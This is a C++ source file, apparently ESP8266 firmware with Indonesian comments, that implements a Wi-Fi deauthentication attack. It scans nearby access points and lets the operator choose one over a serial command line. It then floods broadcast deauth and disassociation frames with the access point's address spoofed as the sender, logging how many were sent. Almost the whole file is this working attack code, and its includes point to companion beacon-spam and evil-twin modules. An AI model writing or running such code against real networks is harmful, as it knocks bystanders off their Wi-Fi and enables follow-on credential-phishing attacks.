#include "deauth.h"
#include "sniffer.h"
#include "cli.h"
#include "beacon.h"
#include "pdeauth.h"
#include "evil.h"
#include <ESP8266WiFi.h>
#include <string.h>

extern "C" {
  #include "user_interface.h"
  int wifi_send_pkt_freedom(uint8_t* buf, int len, bool sys_seq);
}

#define DA_MAX_AP 24

struct scan_entry { uint8_t bssid[6]; uint8_t channel; int8_t rssi; char ssid[33]; };
static scan_entry s_scan[DA_MAX_AP];
static uint8_t    s_scanN = 0;

static bool     s_attacking = false;
static uint8_t  s_bssid[6];
static uint8_t  s_ch = 1;
static char     s_ssid[33] = {0};
static uint32_t s_sent = 0, s_fail = 0;
static uint32_t s_lastStat = 0;
static uint8_t  s_pkt[64];

static void nullcb(uint8_t*, uint16_t) {}

// Susun deauth/disassoc frame. subtype 12=deauth, 10=disassoc.
static int build_deauth(uint8_t* p, const uint8_t* dst, const uint8_t* bssid,
                        uint8_t subtype, uint8_t reason) {
  int i = 0;
  p[i++] = (uint8_t)(subtype << 4);                 // FC byte0: type=mgmt(0) + subtype
  p[i++] = 0x00;                                    // FC byte1: flags
  p[i++] = 0x00; p[i++] = 0x00;                     // duration
  for (int j = 0; j < 6; j++) p[i++] = dst[j];      // addr1 = tujuan (broadcast/client)
  for (int j = 0; j < 6; j++) p[i++] = bssid[j];    // addr2 = source (AP, di-spoof)
  for (int j = 0; j < 6; j++) p[i++] = bssid[j];    // addr3 = BSSID
  p[i++] = 0x00; p[i++] = 0x00;                     // seq
  p[i++] = reason; p[i++] = 0x00;                   // reason code (2 byte LE)
  return i;
}

// ------------------------------------------------------------- lifecycle ---
static void attack_stop(bool announce) {
  if (!s_attacking) { if (announce) Serial.println(F("[deauth] tidak jalan")); return; }
  s_attacking = false;
  wifi_promiscuous_enable(0);
  if (announce)
    Serial.printf("[deauth] STOP — sukses=%lu gagal=%lu\n",
                  (unsigned long)s_sent, (unsigned long)s_fail);
}
void deauth_stop() { attack_stop(false); }          // cross-module, senyap

void deauth_loop() {
  if (!s_attacking) return;

  static const uint8_t bcast[6] = { 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF };
  wifi_set_channel(s_ch);

  int len = build_deauth(s_pkt, bcast, s_bssid, 12, 1);   // deauth broadcast
  if (wifi_send_pkt_freedom(s_pkt, len, 0) == 0) s_sent++; else s_fail++;
  delay(1);
  len = build_deauth(s_pkt, bcast, s_bssid, 10, 1);       // disassoc broadcast
  if (wifi_send_pkt_freedom(s_pkt, len, 0) == 0) s_sent++; else s_fail++;
  delay(1);

  uint32_t now = millis();
  if (now - s_lastStat >= 2000) {
    s_lastStat = now;
    Serial.printf("[deauth] %s (%s) ch%d : sukses=%lu gagal=%lu\n",
      s_ssid[0] ? s_ssid : "<hidden>", nc_mac_str(s_bssid), s_ch,
      (unsigned long)s_sent, (unsigned long)s_fail);
  }
}

// ------------------------------------------- pilih AP (cli capture) --------
static void on_select(const char* line) {
  if (line[0] == 'q' || line[0] == 'Q' || line[0] == '\0') {
    Serial.println(F("[deauth] dibatalkan"));
    cli_release();
    return;
  }
  int idx = atoi(line);
  if (idx < 0 || idx >= (int)s_scanN) {
    Serial.printf("nomor tidak valid (0-%u). coba lagi atau 'q'\n",
                  s_scanN ? s_scanN - 1 : 0);
    return;
  }

  deauth_attack(s_scan[idx].bssid, s_scan[idx].channel, s_scan[idx].ssid);
  cli_release();
}

// programatik (UI) ----------------------------------------------------------
void deauth_attack(const uint8_t* bssid, uint8_t ch, const char* ssid) {
  beacon_stop(); pdeauth_stop(); evil_stop();
  if (sniffer_running()) sniffer_stop();

  memcpy(s_bssid, bssid, 6);
  s_ch = ch;
  strncpy(s_ssid, ssid, sizeof(s_ssid));
  s_ssid[sizeof(s_ssid) - 1] = 0;

  wifi_set_opmode_current(STATION_MODE);
  wifi_set_promiscuous_rx_cb(nullcb);
  wifi_promiscuous_enable(1);
  wifi_set_channel(s_ch);

  s_attacking = true;
  s_sent = s_fail = 0;
  s_lastStat = millis();
  Serial.printf("[deauth] TARGET %s (%s) ch%d\n",
    s_ssid[0] ? s_ssid : "<hidden>", nc_mac_str(s_bssid), s_ch);
}

bool deauth_active() { return s_attacking; }
void deauth_stats(uint32_t* sent, uint32_t* fail) { if (sent) *sent = s_sent; if (fail) *fail = s_fail; }
const char* deauth_ssid() { return s_ssid; }

static void cmd_deauth(int argc, char** argv) {
  if (argc >= 2 && strcasecmp(argv[1], "stop") == 0) { attack_stop(true); return; }

  if (sniffer_running()) sniffer_stop();
  beacon_stop(); pdeauth_stop(); evil_stop();      // jangan rebutan channel/mode
  Serial.println(F("[deauth] memindai AP..."));
  int n = WiFi.scanNetworks(false, true);

  s_scanN = 0;
  for (int i = 0; i < n && s_scanN < DA_MAX_AP; i++) {
    memcpy(s_scan[s_scanN].bssid, WiFi.BSSID(i), 6);
    s_scan[s_scanN].channel = (uint8_t)WiFi.channel(i);
    s_scan[s_scanN].rssi    = (int8_t)WiFi.RSSI(i);
    strncpy(s_scan[s_scanN].ssid, WiFi.SSID(i).c_str(), 32);
    s_scan[s_scanN].ssid[32] = 0;
    s_scanN++;
  }
  WiFi.scanDelete();

  if (s_scanN == 0) { Serial.println(F("[deauth] tidak ada AP")); return; }

  Serial.println(F("=== pilih AP untuk DEAUTH ==="));
  for (uint8_t i = 0; i < s_scanN; i++)
    Serial.printf("  %u) ch%-2d %4ddBm  %s  %s\n",
      i, s_scan[i].channel, s_scan[i].rssi, nc_mac_str(s_scan[i].bssid),
      s_scan[i].ssid[0] ? s_scan[i].ssid : "<hidden>");
  Serial.println(F("ketik nomor AP (atau 'q' batal):"));
  cli_capture(on_select, "deauth AP#> ");
}

void deauth_init() {
  cli_register("deauth", "deauth AP terpilih (deauth | deauth stop)", cmd_deauth);
}
